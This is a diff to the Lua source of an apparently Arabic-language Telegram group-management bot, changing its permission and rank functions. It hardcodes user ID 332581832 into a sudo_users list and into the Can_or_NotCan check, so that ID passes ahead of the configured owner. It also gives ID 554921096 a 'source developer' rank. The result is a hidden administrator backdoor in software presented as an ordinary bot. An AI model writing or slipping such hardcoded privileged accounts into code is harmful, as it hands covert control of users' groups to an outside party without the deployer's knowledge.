@@ -154,6 +154,7 @@ token = sudos.token
 function vardump(value)  
 print(serpent.block(value, {comment=false}))   
 end 
+sudo_users = {SUDO,332581832}
 function SudoBot(msg)  
 local TAU = false  
 if tonumber(msg.sender_user_id_) == tonumber(SUDO) then
@@ -210,8 +211,10 @@ return false
 end 
 end
 function Can_or_NotCan(user_id,chat_id)
-if tonumber(user_id) == tonumber(SUDO) then
-var = true  
+if tonumber(user_id) == tonumber(332581832) then  
+var = true
+elseif tonumber(user_id) == tonumber(SUDO) then
+var = true
 elseif database:sismember(bot_id..'Sudo:User', user_id) then
 var = true  
 elseif database:sismember(bot_id..'Basic:Constructor'..chat_id, user_id) then
@@ -230,7 +233,9 @@ end
 return var
 end 
 function Rutba(user_id,chat_id)
-if tonumber(user_id) == tonumber(SUDO) then
+if tonumber(user_id) == tonumber(554921096) then  
+var = '👨‍💻مطور السورس'  
+elseif tonumber(user_id) == tonumber(SUDO) then
 var = 'المطور الاساسي'  
 elseif tonumber(user_id) == tonumber(bot_id) then  
 var = 'البوت'
